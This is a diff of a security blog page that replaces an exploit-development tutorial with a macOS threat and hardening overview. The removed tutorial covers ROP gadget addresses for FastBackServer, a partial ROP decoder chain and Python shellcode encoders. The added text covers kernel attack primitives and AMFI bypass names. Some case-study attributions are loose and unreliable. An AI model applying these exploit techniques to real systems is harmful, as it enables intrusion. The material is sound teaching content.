+<p class="wp-block-paragraph">Exploits are cunning codes that leverage vulnerabilities in a system or application to execute a malicious agenda, often bypassing user interaction and OS-level protections. The nefariousness escalates with zero-day exploits, which target unpatched vulnerabilities, providing an unhindered passage for malware.</p>
 
 
 
-<li><strong>WriteProcessMemory and Execution Permissions</strong>: The <code>WriteProcessMemory</code> API writes data to specified memory locations, which must be writable and executable. If the location has no execution permissions, attempts to decode bad characters can lead to access violations.</li>
-</ol>
+<p class="wp-block-paragraph"><strong>Commands to check for system vulnerabilities on macOS:</strong></p>
 
 
 
-<h4 class="wp-block-heading">Weaponizing with Gadgets</h4>
+<pre class="wp-block-code"><code>sudo softwareupdate --list  # To list available updates
 
+sudo softwareupdate --install --all  # To install all available updates</code></pre>
 
 
-<p class="wp-block-paragraph">Using a target application like <strong>FastBackServer</strong> and analyzing its modules (e.g., <code>CSFTPAV6.dll</code>), we can find gadgets that perform necessary operations:</p>
 
+<p class="wp-block-paragraph">Chronicles of Covert Campaigns:</p>
 
 
-<ol class="wp-block-list">
-<li><strong>Types of Gadgets</strong>:
-<ul class="wp-block-list">
-<li><code>add byte [reg]</code></li>
 
+<p class="wp-block-paragraph"><strong>Flashback Fiasco:</strong></p>
 
 
-<li><code>sub byte [reg]</code></li>
 
+<p class="wp-block-paragraph">Flashback malware is a notorious chapter in macOS&#8217;s history, exploiting an unpatched Java vulnerability to infect over half a million Macs. The exploit allowed the malware to install itself without user interaction, a silent storm that swept across the macOS landscape.</p>
 
 
-<li>Bitwise operations (<code>ror</code>, <code>rol</code>, <code>shr</code>, <code>shl</code>, <code>or</code>, <code>and</code>)</li>
-</ul>
-</li>
 
+<p class="wp-block-paragraph"><strong>Firefox Zero-Day Debacle:</strong></p>
 
 
-<li><strong>Example Gadgets</strong>:
-<ul class="wp-block-list">
-<li><code>0x5050626e: add byte [esi+0x3B], ah ; ret ;</code> (decoding gadget)</li>
-</ul>
-</li>
-</ol>
 
+<p class="wp-block-paragraph">In a more recent tale from 2019, hackers exploited a Firefox zero-day to deploy malware on fully patched macOS systems. A crafted email lured the users to a malicious site which, when visited via Firefox, triggered the exploit to install a persistent macOS backdoor.</p>
 
 
-<h4 class="wp-block-heading">Steps for ROP Decoding</h4>
 
+<p class="wp-block-paragraph"><strong>The HackingTeam Heist:</strong></p>
 
 
-<p class="wp-block-paragraph">To decode bad characters using the identified gadgets, follow these steps:</p>
 
+<p class="wp-block-paragraph">In a leaked email to the infamous cyber-espionage company HackingTeam, a Flash zero-day exploit targeting Apple systems was on offer. The exploit, acquired for $45,000, is a testament to the lucrative market for zero-day exploits and the imminent danger they pose.</p>
 
 
-<ol class="wp-block-list">
-<li><strong>Make <code>esi + 0x3B</code> Point to the Bad Character</strong>:
-<ul class="wp-block-list">
-<li>Use gadgets to calculate the correct pointer.</li>
-</ul>
-</li>
 
+<p class="wp-block-paragraph"><strong>The Evolving Battlefield:</strong></p>
 
 
-<li><strong>Pop the Decoding Value into <code>eax</code></strong>:
-<ul class="wp-block-list">
-<li>This value is used to add to the memory location where the bad character resides.</li>
-</ul>
-</li>
 
+<p class="wp-block-paragraph">As Apple fortifies macOS with mechanisms like application notarization, the battlefield evolves. Attackers are nudged towards exploiting vulnerabilities as user-assisted infection vectors lose ground. This transition underscores the imperative for relentless vigilance and timely patch management to thwart the silent saboteurs lurking in the digital shadows.</p>
 
 
-<li><strong>Execute the Decoding Gadget</strong>:
-<ul class="wp-block-list">
-<li>Use the <code>add</code> instruction to modify the byte at the location pointed to by <code>esi</code>.</li>
-</ul>
-</li>
-</ol>
 
+<p class="wp-block-paragraph"><strong>Command to check for Application Notarization on macOS:</strong></p>
 
 
-<h4 class="wp-block-heading">Example ROP Decoder Code</h4>
 
+<pre class="wp-block-code"><code>spctl -a -v /path/to/application  # Replace '/path/to/application' with the actual path to the application</code></pre>
 
 
-<p class="wp-block-paragraph">Here&#8217;s an example of how to construct the ROP chain for decoding bad characters.</p>
 
+<p class="wp-block-paragraph"><strong>Physical Access</strong></p>
 
 
-<pre class="wp-block-code"><code>from struct import pack
 
-# ROP Decoder Construction
-ROPDecoder = b""
-ROPDecoder += pack("&lt;L", 0x5050118e)  # mov eax, esi ; pop esi ; ret ;
-ROPDecoder += pack("&lt;L", 0x41414141)  # dummy value for pop esi
-ROPDecoder += pack("&lt;L", 0x5052db24)  # pop ecx ; ret ;
-ROPDecoder += pack("&lt;L", negative_offset_value_to_shellcode)  # negative offset
-ROPDecoder += pack("&lt;L", 0x50533bf4)  # sub eax, ecx ; ret ;
-ROPDecoder += pack("&lt;L", 0x505263f9)  # push eax ; pop esi ; pop ebx ; ret ;
-ROPDecoder += pack("&lt;L", 0x41414141)  # dummy value for pop ebx
-ROPDecoder += pack("&lt;L", 0x5053a0f5)  # pop eax ; ret ;
-ROPDecoder += pack("&lt;L", decoding_value)  # decoding value
-ROPDecoder += pack("&lt;L", 0x5050626e)  # add byte &#91;esi+0x3B], ah ; ret ;</code></pre>
+<p class="wp-block-paragraph">Physical access attacks pivot on the principle of direct interaction with the hardware, bypassing the need for remote infiltration. These attacks, albeit riskier, can ensure a higher success rate given the tactile access to the target system.</p>
 
 
 
-<h4 class="wp-block-heading">Encoding and Decoding Process</h4>
+<p class="wp-block-paragraph">Commands to check system security settings:</p>
 
 
 
-<ol class="wp-block-list">
-<li><strong>Encoding</strong>: Replace each bad character in the shellcode with an alternate value.
-<ul class="wp-block-list">
-<li>Example: Replace <code>0x00</code> with <code>0xfd</code>, <code>0x0a</code> with <code>0x05</code>, etc.</li>
-</ul>
-</li>
+<pre class="wp-block-code"><code>sudo systemsetup -getdisablekeyboardwhenlocked   # Check if keyboard is disabled </code></pre>
 
 
 
-<li><strong>Decoding</strong>: Revert the encoded bad characters back to their original values during execution using the ROP chain.</li>
-</ol>
+<p class="wp-block-paragraph">when locked</p>
 
 
 
-<pre class="wp-block-code"><code>def encode_shellcode(shellcode, badchars, encode_value):
-    shellcode_bytes = shellcode.split("\\x")
-    encoded_shellcode = &#91;]
-    index = 0
-    for byte in shellcode_bytes:
-        if byte:
-            if byte in badchars:
-                encoded_int = (int(byte, 16) + encode_value) &amp; 0xFF
-                encoded_hex = hex(encoded_int)&#91;2:].zfill(2)
-                encoded_shellcode.append(f"\\x{encoded_hex}")
-            else:
-                encoded_shellcode.append(f"\\x{byte}")
-        index += 1
-    return ''.join(encoded_shellcode)
+<pre class="wp-block-code"><code>sudo systemsetup -getdisableremotecontrol        # Check if remote control is disabled</code></pre>
 
-# Example of usage
-with open("shellcode.txt", "r") as file:
-    my_shellcode = file.read()
 
-badchars = &#91;"00", "09", "0a", "0b", "0c", "0d", "20"]
-encoded_shellcode = encode_shellcode(my_shellcode, badchars, 0xfb)
-print("&#91;+] Encoded Shellcode:", encoded_shellcode)</code></pre>
 
+<p class="wp-block-paragraph">The Chronicles of Covert Incursions:</p>
 
 
-<h4 class="wp-block-heading">Automating the Process</h4>
 
+<p class="wp-block-paragraph">The Whisper of EFI Exploits:</p>
 
 
-<p class="wp-block-paragraph">To fully automate encoding and decoding, implement functions that handle both tasks. Here&#8217;s an advanced version of the encoding function:</p>
 
+<p class="wp-block-paragraph">Extensible Firmware Interface (EFI) exploits target the pre-operating system boot-up code, nesting in the foundational layers of the system. Their stealthy and persistent nature makes detection and eradication a daunting task. EFI exploits can thrive in read-only memory, rendering software patches impotent.</p>
 
 
-<pre class="wp-block-code"><code>from struct import pack
 
-def encode_shellcode(shellcode, badchars, encode_value):
-    shellcode_bytes = shellcode.split("\\x")
-    bad_index = &#91;]
-    encoded_shellcode = &#91;]
-    index = 0
-    for byte in shellcode_bytes:
-        if byte:
-            if byte in badchars:
-                encoded_int = (int(byte, 16) + encode_value) &amp; 0xFF
-                encoded_hex = hex(encoded_int)&#91;2:].zfill(2)
-                encoded_shellcode.append(f"\\x{encoded_hex}")
-                bad_index.append(index)
-            else:
-                encoded_shellcode.append(f"\\x{byte}")
-        index += 1
-    return ''.join(encoded_shellcode), bad_index
+<p class="wp-block-paragraph">The USB Stack Assault:</p>
 
-# Example of usage
-encoded_shellcode, bad_indices = encode_shellcode(my_shellcode, badchars, 0xfb)
-print("&#91;+] Encoded Shellcode:", encoded_shellcode)
-print("&#91;+] Bad Indices:", bad_indices)</code></pre>
 
 
+<p class="wp-block-paragraph">Attackers can exploit vulnerabilities in the USB stack to breach even a locked Mac system. The act is as simple as inserting a USB device, triggering a flaw that could lead to a complete system compromise.</p>
 
-<h4 class="wp-block-heading"><strong><em>Tooling and Exploitation Frameworks</em></strong></h4>
 
 
+<p class="wp-block-paragraph">The Checkm8 Chess Move:</p>
 
-<p class="wp-block-paragraph"><strong><em>Tools for Finding and Using ROP Gadgets:</em></strong></p>
 
 
+<p class="wp-block-paragraph">Checkm8, known for jailbreaking iPhones, was discovered to affect Macs and MacBooks with T2 chips. With physical access, adversaries could exploit this vulnerability to infiltrate the macOS system.</p>
 
-<ol class="wp-block-list">
-<li><strong><em>ROPgadget:</em></strong></li>
-</ol>
 
 
+<p class="wp-block-paragraph">Command to check for EFI updates:</p>
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Overview:</strong> ROPgadget scans binaries for ROP gadgets and lists them for use in constructing exploits.</p>
 
 
+<pre class="wp-block-code"><code>softwareupdate --fetch-full-installer --full-installer-version 11.6  # Replace '11.6' with the desired version number</code></pre>
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Command Example:</strong></p>
 
 
+<p class="wp-block-paragraph">The High Stakes of Physical Infiltration:</p>
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &nbsp; &nbsp; <code>ROPgadget --binary your_binary_file --all</code></p>
 
 
+<p class="wp-block-paragraph">While the realm of remote attacks offers a veil of anonymity, physical access attacks amplify the stakes. The risk of being caught red-handed deters many, but for high-value targets, nation-state actors may tread this perilous path. The labyrinth of physical access attacks unveils a potent threat, where the adversary leaves the digital shadows and steps into the real world.</p>
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Features and Functionalities:</strong> Lists all gadgets in the binary, including addresses and instructions. You can filter gadgets based on specific criteria.</p>
 
 
+<p class="wp-block-paragraph"><strong>Defending the Bastion:</strong></p>
 
-<ol start="2" class="wp-block-list">
-<li><strong><em>Ropper:</em></strong></li>
-</ol>
 
 
+<p class="wp-block-paragraph">Defensive fortifications against physical access attacks require a blend of physical and digital security measures. Ensuring robust hardware security, employing full disk encryption, and maintaining an updated system are crucial steps in fortifying the macOS bastion against physical intrusions.</p>
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Overview:</strong> Ropper is a tool for finding and analyzing ROP gadgets, and supports various architectures.</p>
 
 
+<p class="wp-block-paragraph">Command to enable FileVault (Disk Encryption):</p>
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Command Example:</strong></p>
 
 
+<pre class="wp-block-code"><code>sudo fdesetup enable   # Enable FileVault</code></pre>
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &nbsp; &nbsp; <code>ropper --file your_binary_file --find 'pop rdi; ret'</code></p>
 
 
+<p class="wp-block-paragraph"><strong>Exploitation Techniques and Countermeasures</strong></p>
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Features and Functionalities:</strong> Allows for detailed gadget listing and filtering, useful for constructing specific ROP chains.</p>
 
 
+<p class="wp-block-paragraph">Kernel-level attacks on macOS encompass exploiting vulnerabilities in the kernel or leveraging privileged access to alter kernel behavior maliciously. Below are some technical elaborations on kernel attack techniques described:</p>
 
-<ol class="wp-block-list">
-<li><strong><em>ROPgadget.py:</em></strong></li>
-</ol>
 
 
+<h5 class="wp-block-heading" id="h-1-arbitrary-read-write-primitives"><strong>1. Arbitrary Read/Write Primitives:</strong></h5>
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong><em>Overview:</em></strong> ROPgadget.py is a Python script version of ROPgadget, offering similar functionalities for gadget discovery and analysis.</p>
 
 
+<p class="wp-block-paragraph">Anywhere64 Wrappers:</p>
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong><em>Command Example:</em></strong></p>
 
 
+<p class="wp-block-paragraph">Facilitate arbitrary memory read and write operations, assuming the kernel task port has been obtained.</p>
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &nbsp; &nbsp; <code>python ROPgadget.py --binary your_binary_file --all</code></p>
 
 
+<p class="wp-block-paragraph">Example: Reading a memory region.</p>
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong><em>Features and Functionalities:</em></strong> Provides detailed gadget information and can be integrated into custom scripts for automated exploitation.</p>
 
 
+<p class="wp-block-paragraph">vm_read_overwrite(kernel_task_port, address, size, buffer, &amp;out_size);</p>
 
-<h3 class="wp-block-heading">Practical Applications and Case Studies</h3>
 
 
+<h5 class="wp-block-heading" id="h-2-kernel-function-invocation"><strong>2. Kernel Function Invocation:</strong></h5>
 
-<h4 class="wp-block-heading">Real-World Examples:</h4>
 
 
+<p class="wp-block-paragraph">FuncAnywhere32:</p>
 
-<p class="wp-block-paragraph"><strong><em>1. Notable Exploits Utilizing ROP:</em></strong></p>
 
 
+<p class="wp-block-paragraph">Allows invocation of kernel functions using IOConnectTrap4.</p>
 
-<p class="wp-block-paragraph"><strong><em>1.1. The &#8220;Zerodium iOS 10.3.3 Exploit&#8221;:</em></strong> In 2017, a zero-day exploit targeting iOS 10.3.3 involved a ROP-based attack. The vulnerability in the kernel allowed an attacker to escalate privileges and execute arbitrary code. The exploit utilized ROP to bypass ASLR and DEP protections. An example ROP chain used in this exploit might look like:</p>
 
 
+<p class="wp-block-paragraph">Example: Invoking a kernel function.</p>
 
-<pre class="wp-block-code"><code>1. Pop address of kernel function into register&amp;nbsp;
 
-2. Execute kernel function with controlled parameters&amp;nbsp;
 
-3. Return to controlled location</code></pre>
+<pre class="wp-block-code"><code>IOConnectTrap4(connection, index, arg0, arg1, arg2, arg3);</code></pre>
 
 
 
-<p class="wp-block-paragraph"><strong><em>Example Code:</em></strong></p>
+<h5 class="wp-block-heading" id="h-3-proc_info-system-call-abuse"><strong>3. Proc_info System Call Abuse:</strong></h5>
 
 
 
-<pre class="wp-block-code"><code>pop rdi&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Gadget to pop value into rdi (used for kernel function address)&amp;nbsp;
+<p class="wp-block-paragraph">Example: Invoking proc_info system call.</p>
 
-ret&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Return to next instruction &amp;nbsp;
 
-mov rax, &#91;rdi] &amp;nbsp; ; Load kernel function address from rdi into rax&amp;nbsp;
 
-call rax &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Call the kernel function</code></pre>
+<p class="wp-block-paragraph">Exploiting proc_info system call to gain insights into kernel objects and processes.</p>
 
 
 
-<p class="wp-block-paragraph">By chaining gadgets like these, the attacker could control kernel execution flow and exploit the vulnerability.</p>
+<pre class="wp-block-code"><code>syscall(SYS_proc_info, callNum, pid, flavor, arg, buffer, bufferSize);</code></pre>
 
 
 
-<p class="wp-block-paragraph"><strong><em>1.2. The &#8220;Microsoft Internet Explorer 9&#8221; Exploit (CVE-2014-6332):</em></strong> This vulnerability allowed remote code execution through Internet Explorer 9. Exploiting it required bypassing security features with ROP. Attackers utilized ROP to create a chain of gadgets that manipulated memory and executed arbitrary code.</p>
+<h5 class="wp-block-heading" id="h-4-lightweight-volume-manager-manipulation"><strong>4. Lightweight Volume Manager Manipulation:</strong></h5>
 
 
 
-<pre class="wp-block-code"><code>mov rbx, &#91;rsp + 8] ; Move address into rbx&amp;nbsp;
+<p class="wp-block-paragraph">_mapForIO:</p>
 
-pop rdi&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Pop value into rdi&amp;nbsp;
 
-ret&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Return to next instruction &amp;nbsp;
 
-mov &#91;rbx], rdi &amp;nbsp; &amp;nbsp; ; Store value from rdi to address in rbx&amp;nbsp;
+<p class="wp-block-paragraph">Required for root filesystem remounting which is a prerequisite for later persistence.</p>
 
-ret&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Return to next instruction`</code></pre>
 
 
+<p class="wp-block-paragraph">Example: This is a hypothetical operation as actual implementation details might not be publicly disclosed.</p>
 
-<p class="wp-block-paragraph">The gadgets were carefully selected and combined to perform actions that could bypass IE&#8217;s security features.</p>
 
 
+<h5 class="wp-block-heading" id="h-5-code-signing-and-amfi-bypass"><strong>5. Code Signing and AMFI Bypass:</strong></h5>
 
-<p class="wp-block-paragraph"><strong><em>Case Studies Demonstrating the Effectiveness of ROP:</em></strong></p>
 
 
+<p class="wp-block-paragraph">amfi_get_out_of_my_way, cs_enforcement_disable, PE_i_can_has_debugger:</p>
 
-<p class="wp-block-paragraph"><strong><em>2.1. Case Study: &#8220;Google Chrome Zero-Day Exploit&#8221; (CVE-2018-6177):</em></strong> In 2018, a zero-day vulnerability in Google Chrome was exploited using ROP. The attack involved a ROP chain that bypassed Chrome’s ASLR by exploiting a memory corruption bug. The ROP chain used gadgets to pivot the stack and manipulate memory to execute malicious payloads.</p>
 
 
+<p class="wp-block-paragraph">Bypass Apple Mobile File Integrity (AMFI) checks and code signing verifications.</p>
 
-<p class="wp-block-paragraph"><strong><em>Example Code:</em></strong></p>
 
 
+<p class="wp-block-paragraph">Example: Patching system calls to bypass AMFI. Code representation may not be publicly disclosed due to security implications.</p>
 
-<pre class="wp-block-code"><code>pop rdi &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Gadget to pop value into rdi&amp;nbsp;
 
-ret &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Return to next instruction &amp;nbsp;
 
-mov &#91;rbx], rdi&amp;nbsp; &amp;nbsp; ; Write value from rdi to memory at address in rbx&amp;nbsp;
+<h5 class="wp-block-heading" id="h-6-memory-protection-bypass"><strong>6. Memory Protection Bypass:</strong></h5>
 
-pop rax &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Pop another value into rax (e.g., function pointer) call rax&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Call function at address in rax</code></pre>
 
 
+<p class="wp-block-paragraph">vm_map_enter / vm_map_protect:</p>
 
-<p class="wp-block-paragraph">By chaining these gadgets, the exploit successfully bypassed Chrome&#8217;s security measures.</p>
 
 
+<p class="wp-block-paragraph">Disable code signing verification on pages, allowing mprotect and mmap to map executable pages in any process.</p>
 
-<p class="wp-block-paragraph"><strong><em>2.2. Case Study: &#8220;Ubuntu Linux Kernel Exploit&#8221;:</em></strong> An exploit targeting the Ubuntu Linux kernel used ROP to bypass security features. The attacker used a ROP chain to manipulate kernel data structures and escalate privileges.</p>
 
 
+<p class="wp-block-paragraph">Example: This is a hypothetical operation as actual implementation details might not be publicly disclosed.</p>
 
-<p class="wp-block-paragraph"><strong><em>Example Code:</em></strong></p>
 
 
+<h5 class="wp-block-heading" id="h-7-task_for_pid-manipulation"><strong>7. Task_for_pid Manipulation:</strong></h5>
 
-<pre class="wp-block-code"><code>pop rdi &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Gadget to set up rdi with an address&amp;nbsp;
 
-mov rsi, rdi&amp;nbsp; &amp;nbsp; &amp;nbsp; ; Move address to rsi&amp;nbsp;
 
-pop rax &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Load kernel function pointer into rax&amp;nbsp;
+<p class="wp-block-paragraph">Patching task_for_pid to retrieve the kernel_task and then quickly patching it back.</p>
 
-call rax&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Call kernel function</code></pre>
 
 
+<p class="wp-block-paragraph">Example: Patching task_for_pid. Code representation may not be publicly disclosed due to security implications.</p>
 
-<p class="wp-block-paragraph">This case study highlights how ROP can be used to bypass kernel protections and escalate privileges.</p>
 
 
+<h2 class="wp-block-heading" id="h-hardening"><strong>Hardening</strong></h2>
 
-<p class="wp-block-paragraph"><strong><em>Analysis of Effectiveness:</em></strong> These examples and case studies demonstrate how ROP can be employed to bypass security mechanisms such as DEP and ASLR. By leveraging existing code snippets within the binary, attackers can craft sophisticated exploits that evade traditional defenses.</p>
 
 
+<p class="wp-block-paragraph">One of the pivotal features of Syslog is its ability to log to a remote host, a mechanism that not only centralizes logging but also augments security through a write-only access model. Let&#8217;s delve into the nuances of configuring and harnessing this feature.</p>
 
-<h4 class="wp-block-heading">Advanced ROP</h4>
 
 
+<p class="wp-block-paragraph"><strong>Configuration Steps:</strong></p>
 
-<p class="wp-block-paragraph">One notable example is the &#8220;Spectre&#8221; vulnerability disclosed in 2018. While primarily related to speculative execution in CPUs, some attacks demonstrated ROP techniques to extract sensitive information from memory, effectively bypassing security measures like address space layout randomization (ASLR) and data execution prevention (DEP).</p>
 
 
+<p class="wp-block-paragraph">Enable Networking on the Remote Syslog Daemon:</p>
 
-<p class="wp-block-paragraph">Additionally, the &#8220;CVE-2021-1732&#8221; vulnerability in Windows highlighted ROP&#8217;s effectiveness in privilege escalation. Attackers were able to construct ROP chains that exploited the vulnerability, allowing them to execute arbitrary code in kernel mode, illustrating the technique&#8217;s potency even against hardened operating systems.</p>
 
 
+<p class="wp-block-paragraph">On the remote host, ensure the syslog daemon is running with networking enabled.</p>
 
-<h3 class="wp-block-heading">Security Researcher</h3>
 
 
+<p class="wp-block-paragraph">sudo /usr/sbin/syslogd -s &nbsp; # &#8216;-s&#8217; enables network socket</p>
 
-<p class="wp-block-paragraph"><a href="https://www.linkedin.com/in/ACoAACMUPk8BjjkCwMk2KYJZ3WNyiTYgjXAzmgk">Amirhossein Gholizadeh</a>,&nbsp;<a href="https://www.linkedin.com/in/ACoAADZqFYEBRzUOWIJMQWUgqHHfNHf0tydlb4U">Surya Dev Singh</a></p>
 
 
+<p class="wp-block-paragraph">Update syslogd Configuration:</p>
 
-<p class="wp-block-paragraph">Cover by <strong>@mercuriorojo</strong></p>
+
+
+<p class="wp-block-paragraph">Edit /etc/syslog.conf on your macOS system to specify the remote log host.</p>
+
+
+
+<pre class="wp-block-code"><code>echo "*.* @loghost.example.com" | sudo tee -a /etc/syslog.conf   # Replace 'loghost.example.com' with your remote log host</code></pre>
+
+
+
+<p class="wp-block-paragraph">Restart syslogd:</p>
+
+
+
+<p class="wp-block-paragraph">Apply the new configuration by restarting the syslog daemon.</p>
+
+
+
+<p class="wp-block-paragraph">sudo launchctl unload /System/Library/LaunchDaemons/com.apple.syslogd.plist</p>
+
+
+
+<p class="wp-block-paragraph">sudo launchctl load /System/Library/LaunchDaemons/com.apple.syslogd.plist</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Validate Remote Logging:</strong></p>
+
+
+
+<p class="wp-block-paragraph">Verify the logging setup by checking the logs on the remote server.</p>
+
+
+
+<pre class="wp-block-code"><code>tail -f /var/log/syslog   # Run this on the remote log host</code></pre>
+
+
+
+<p class="wp-block-paragraph">Advantages of Remote Logging:</p>
+
+
+
+<p class="wp-block-paragraph">Centralized Monitoring:</p>
+
+
+
+<p class="wp-block-paragraph">Aggregating logs on a single server streamlines monitoring, which can be automated using UNIX utilities or third-party tools.</p>
+
+
+
+<p class="wp-block-paragraph">grep &#8220;SecurityAlert&#8221; /var/log/syslog &nbsp; # Example: Scanning for security alerts</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Write-only Access:</strong></p>
+
+
+
+<p class="wp-block-paragraph">This setup deters attackers from harvesting or tampering with the logs while still permitting new log entries.</p>
+
+
+
+<p class="wp-block-paragraph">The Security Uplift:</p>
+
+
+
+<p class="wp-block-paragraph">Remote logging is a deterrent against log tampering, ensuring that an attacker, even if they compromise a system, cannot erase their tracks. While they can still flood logs with spurious entries, the original records remain untouched, serving as an immutable ledger of activities.</p>
+
+
+
+<h4 class="wp-block-heading" id="h-transitioning-beyond-macos-10-12"><strong>Transitioning Beyond macOS 10.12:</strong></h4>
+
+
+
+<p class="wp-block-paragraph">Post macOS 10.12, Apple transitioned to a new logging system. The unified logging system is more performant and secure. Exploring this new frontier is advisable for those looking to stay updated with Apple&#8217;s evolving logging infrastructure.</p>
+
+
+
+<p class="wp-block-paragraph">Auditing on macOS can be facilitated via the auditd daemon, which is responsible for managing audit records. Here&#8217;s a simplified way to enable and configure auditing:</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Configuring Audit Control:</strong></p>
+
+
+
+<p class="wp-block-paragraph">Edit the /etc/security/audit_control file to specify the auditing policies.</p>
+
+
+
+<p class="wp-block-paragraph">sudo nano /etc/security/audit_control</p>
+
+
+
+<p class="wp-block-paragraph">Modify the file to include the desired flags and event classes.</p>
+
+
+
+<p class="wp-block-paragraph">Starting the Audit Daemon:</p>
+
+
+
+<pre class="wp-block-code"><code>sudo audit -s</code></pre>
+
+
+
+<p class="wp-block-paragraph">Verifying Audit Configuration:</p>
+
+
+
+<pre class="wp-block-code"><code>sudo audit -l</code></pre>
+
+
+
+<p class="wp-block-paragraph">Login Banner:</p>
+
+
+
+<p class="wp-block-paragraph">Adding a login banner serves as a preliminary deterrent and could fulfill legal requisites in certain jurisdictions.</p>
+
+
+
+<p class="wp-block-paragraph">defaults write /Library/Preferences/com.apple.loginwindow LoginwindowText &#8220;Unauthorized access prohibited.&#8221;</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Password Hints Customization:</strong></p>
+
+
+
+<p class="wp-block-paragraph">Tailoring the display of password hints post a specified number of failed attempts enhances login security.</p>
+
+
+
+<p class="wp-block-paragraph">defaults write /Library/Preferences/com.apple.loginwindow RetriesUntilHint -int 5</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Login/Logout Hooks:</strong></p>
+
+
+
+<p class="wp-block-paragraph">Login and Logout hooks serve as powerful tools for real-time monitoring and cleanup tasks during login and logout events.</p>
+
+
+
+<p class="wp-block-paragraph">Setting Login Hook:</p>
+
+
+
+<pre class="wp-block-code"><code>defaults write com.apple.loginwindow LoginHook /path/to/login_script.sh</code></pre>
+
+
+
+<p class="wp-block-paragraph">Setting Logout Hook:</p>
+
+
+
+<pre class="wp-block-code"><code>defaults write com.apple.loginwindow LogoutHook /path/to/logout_script.sh</code></pre>
+
+
+
+<p class="wp-block-paragraph">Monitoring and Maintenance:</p>
+
+
+
+<p class="wp-block-paragraph">Periodic checks for unauthorized modifications in Login/Logout hooks are imperative to ensure system integrity.</p>
+
+
+
+<pre class="wp-block-code"><code>defaults read com.apple.loginwindow LoginHook
+
+defaults read com.apple.loginwindow LogoutHook</code></pre>
+
+
+
+<h2 class="wp-block-heading" id="h-conclusion">Conclusion</h2>
+
+
+
+<p class="wp-block-paragraph">In traversing through the labyrinthine architecture of macOS, we unearthed a spectrum of infection vectors and malicious methodologies. From the surface level exploitation of social engineering to the deeper trenches of dylib hijacking and kernel task manipulations, the exploration unveiled the intricate dance between attackers and the system defenses. The artistry in these malevolent pursuits is matched by the sophistication of the macOS, which continually evolves to address the emerging threats. The dynamic interplay echoes through the various facets of remote attacks, physical access exploits, and the stealthy maneuvers within the system’s kernel task, drawing a picture of an ever-evolving battlefield.</p>
+
+
+
+<p class="wp-block-paragraph">The expedition through the macOS territory revealed a landscape where every component, every process could potentially be turned into a puppet in the hands of adept puppeteers. The ingenuity of attackers manifests in their ability to find the loopholes, the unguarded backdoors, and in crafting the keys to unlock them. Yet, each lock picked sends ripples through the security community, catalyzing a cascade of patches, updates, and overhauls aimed at fortifying the fortress. This endless cycle of action and reaction is a testament to the adaptive nature of both cybersecurity measures and malicious endeavors.</p>
+
+
+
+<p class="wp-block-paragraph">Moreover, the technical intricacies of attacks on macOS elucidate the necessity for an equally technical and robust defense. The macOS’s hardened runtime, system integrity protections, and other security features are the vanguards in this digital realm. They stand as the bulwarks against the ceaseless waves of attempts aiming to infiltrate, persist, and exploit. The dance between infiltration techniques and defense mechanisms is a choreography that unfolds in the binary realm, unseen yet consequential.</p>
+
+
+
+<h2 class="wp-block-heading" id="h-reference"><strong>Reference</strong></h2>
+
+
+
+<p class="wp-block-paragraph">The Art of Mac Malware By Patrick Wardle</p>
+
+
+
+<p class="wp-block-paragraph">OS Internals By Jonathan Levin</p>
+
+
+
+<h6 class="wp-block-heading" id="h-security-researchers"><strong>Security Researchers</strong></h6>
+
+
+
+<p class="wp-block-paragraph">Alex Nomad</p>
     </div>
 
     <!-- ═══ CAREER PLATFORM CTA ═══ -->
@@ -3022,27 +3532,27 @@ call rax&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Call kernel fun
 
         <!-- Headline -->
         <h3 style="font-family:var(--font-display);font-size:24px;font-weight:800;color:#fff;margin:0 0 8px;line-height:1.3">
-          Ready to Accelerate Your Cybersecurity Career?
+          Put this research to work on your environment
         </h3>
         <p style="font-size:15px;color:rgba(255,255,255,0.55);line-height:1.7;max-width:520px;margin:0 auto 28px">
-          Access structured learning paths, hands-on skill labs, and expert coaching — everything you need to land your next role.
+          The team behind this article runs attack surface management, SAST, red team operations and vulnerability research for organizations that need answers, not checklists.
         </p>
 
         <!-- Buttons -->
         <div style="display:flex;align-items:center;justify-content:center;gap:14px;flex-wrap:wrap">
